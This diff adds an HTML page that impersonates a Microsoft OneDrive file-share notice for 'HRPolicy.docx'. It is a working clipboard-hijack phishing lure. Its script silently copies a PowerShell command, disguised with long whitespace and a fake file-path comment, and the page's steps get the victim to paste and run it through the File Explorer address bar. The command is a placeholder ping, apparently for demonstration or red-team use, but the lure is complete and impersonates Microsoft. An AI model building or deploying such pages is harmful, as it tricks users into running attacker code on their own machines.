@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<head>
+  <title>OneDrive</title>
+  <style>
+    body {
+      background-color: #F5F5F5;
+      font-family: system-ui, 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+    }
+
+    .container {
+      background-color: #ffffff;
+      width: 560px;
+      border-radius: 8px;
+      border: 1px solid #EDEBE9;
+      text-align: center;
+    }
+
+    .header {
+      padding: 40px 30px 0px;
+    }
+
+    .header img {
+      width: 48px;
+      margin-top: .5em;
+    }
+
+    .header h2 {
+      font-size: 20px;
+      color: #2f2f2f;
+      margin: 0;
+      font-weight: 500;
+      margin-top: 12px;
+    }
+
+    .timestamp {
+      font-size: 13px;
+      color: #7a7a7a;
+      margin-top: 6px;
+    }
+
+    .instructions {
+      text-align: left;
+      padding: 8px 40px 10px;
+      font-size: 15px;
+      color: #333333;
+      line-height: 1.6;
+    }
+    
+    .instructions a {
+    color: black;
+    text-underline-offset: 3px;
+    }
+
+    .instructions ol {
+      margin: 0;
+      padding-left: 20px;
+    }
+
+    .code-block {
+    background-color: #F5F5F5;
+    border: 1px solid rgb(0, 0, 0, .1);
+    border-radius: 6px;
+    padding: 8px 12px;
+    font-family: Consolas, monospace;
+    font-size: 14px;
+    margin-top: 8px;
+    position: relative;
+    transition: background-color 0.3s;
+    cursor: pointer;
+    user-select: none;
+    }
+
+
+    .code-block:hover {
+      background-color: #e6e6e6;
+    }
+
+    .code-block::after {
+      content: "Copy";
+      position: absolute;
+      font-family: system-ui;
+      top: 50%;
+      right: 12px;
+      transform: translateY(-50%);
+      font-size: 12px;
+      background-color: #0078d4;
+      border-radius: 4px;
+      padding: 0px 6px;
+      color: white;
+      opacity: 0;
+      transition: opacity 0.2s;
+    }
+
+    .code-block:hover::after {
+      opacity: 1;
+    }
+
+    .code-block.clicked::after {
+      content: "Copied";
+      padding: 0px;
+      background-color: transparent;
+      color: #107c10;
+    }
+
+    #fileExplorer {
+      background-color: rgb(0, 120, 212);
+      color: white;
+      border: none;
+      padding: 12px 1.4em;
+      font-weight: 500;
+      border-radius: 5px;
+      text-decoration: none;
+      font-size: 15px;
+      margin-bottom: 40px;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background-color .2s;
+    }
+
+    #fileExplorer:hover {
+      background-color: #106EBE;
+    }
+    
+    #fileExplorer:active {
+      background-color: #015A9D;
+     }
+
+    .footer {
+      font-size: 11.5px;
+      color: #6b6b6b;
+      padding: 12px 24px;
+      border-top: 1px solid #EDEBE9;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .footer img {
+      height: 16px;
+    }
+
+    .footer a {
+      color: #6b6b6b;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fd/Microsoft_Office_Word_%282019%E2%80%93present%29.svg">
+      <h2>'HRPolicy.docx' was shared <br>with you with OneDrive</h2>
+      <div class="timestamp">06/20/2025 10:22:45 AM</div>
+    </div>
+
+    <div class="instructions">
+      <p>This file was sent to you by 'Power Automate for Businesses' (flow-noreply@microsoft.com). We've automatically added it to your OneDrive folder, open it below. <a href="#">Report file</a></p>
+      <ol>
+        <li style="margin-bottom: 10px;">
+          Click to copy the file path:
+          <div class="code-block" id="path" onclick="this.classList.add('clicked')">
+            C:\Onedrive\HRPolicy8197d8289284.docx
+          </div>
+        </li>
+        <li style="margin-bottom: 10px;">Open File Explorer and select the address bar (<strong>CTRL + L</strong>)</li>
+        <li style="margin-bottom: 10px;">Press <strong>CTRL + V</strong> then <strong>Enter</strong></li>
+      </ol>
+    </div>
+
+    <input type="file" id="fileInput" style="display: none;">
+    <button id="fileExplorer">Open File Explorer</button>
+
+    <div class="footer">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Microsoft_Office_OneDrive_%282019%E2%80%93present%29.svg" alt="Microsoft">
+      © Microsoft Corp.
+      <a href="#">Manage settings</a>
+    </div>
+  </div>
+  
+  
+    <script>
+    const fileInput = document.getElementById('fileInput');
+    const fileExplorer = document.getElementById('fileExplorer');
+    const path = document.getElementById('path');
+
+    // Copy the powershell command if they click on the dummy file path
+    // In case the user tries to be smart and open file explorer manually
+    path.addEventListener('click', function() {
+        navigator.clipboard.writeText("Powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    ");
+    });
+
+    // Copy powershell command & open file explorer
+    fileExplorer.addEventListener('click', function() {
+        navigator.clipboard.writeText("Powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    ");
+
+      fileInput.click();
+    });
+
+  // Block any attempted file uploads
+  fileInput.addEventListener('change', () => {
+    alert("Please follow the stated instructions.");
+    fileInput.value = "";
+    setTimeout(() => fileInput.click(), 500);
+});
+  </script>
+</body>
+</html>
